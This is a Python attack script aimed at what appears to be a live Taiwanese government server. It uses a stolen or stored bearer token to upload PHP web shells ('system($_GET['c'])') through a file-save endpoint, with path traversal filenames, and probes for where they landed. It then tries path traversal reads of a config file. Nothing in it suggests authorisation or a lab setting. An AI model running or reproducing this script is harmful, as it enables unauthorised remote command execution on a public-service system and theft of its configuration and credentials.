import requests, urllib3
urllib3.disable_warnings()

base = "https://tpertc.tfd.gov.tw"

token = open("/mnt/c/Users/Administrator/Desktop/JySecAI/erpc/data/femet_jwt.txt").read().strip()
headers = {"Authorization": f"Bearer {token}"}

# Try uploading to different paths via file.php
uploads = [
    ("test_upload.php", b"<?php phpinfo(); ?>"),
    ("../../server.js", b"<?php system($_GET['c']); ?>"),
    ("../../app.js", b"<?php system($_GET['c']); ?>"),
]

for fname, content in uploads:
    r = requests.post(f"{base}/rtc/api/file.php?action=save_blob",
        headers=headers,
        data={"fname": fname},
        files={"attachment": (fname, content)},
        verify=False, timeout=10)
    print(f"Upload {fname}: {r.status_code} {r.text[:100]}")
    
    # Try to access the uploaded file
    for path in [f"/rtc/api/{fname}", f"/rtc/{fname}", f"/{fname}", f"/rtc/uploads/{fname}",
                 f"/Images/{fname}", f"/client/{fname}"]:
        r2 = requests.get(f"{base}{path}", headers=headers, verify=False, timeout=8)
        if r2.status_code != 404:
            print(f"  GET {path}: {r2.status_code} {r2.text[:100]}")

# Also check if we can read files via file.php?action=get or download
for action in ["get", "download", "read", "list", "fetch"]:
    r = requests.get(f"{base}/rtc/api/file.php?action={action}",
        params={"fname": "../../config.js"},
        headers=headers, verify=False, timeout=8)
    print(f"file.php?action={action}&fname=../../config.js: {r.status_code} {r.text[:200]}")

print("\nDone")
